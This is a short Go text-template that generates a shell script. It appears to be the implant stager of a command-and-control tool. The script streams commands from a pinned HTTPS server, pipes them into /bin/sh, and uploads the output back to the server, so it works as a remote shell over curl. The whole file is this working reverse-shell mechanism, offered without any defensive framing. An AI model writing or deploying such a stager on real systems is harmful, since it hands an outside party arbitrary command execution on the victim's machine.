{{- define "curl" -}}
curl -Nsk --pinnedpubkey "sha256//{{.PubkeyFP}}" https://{{.URL}}
{{- end -}}
#!/bin/sh

{{template "curl" .}}/{{.URLPaths.In}}/{{.ID}} </dev/null 2>&0 |
/bin/sh 2>&1 |
{{template "curl" .}}/{{.URLPaths.Out}}/{{.ID}} -T- >/dev/null 2>&1
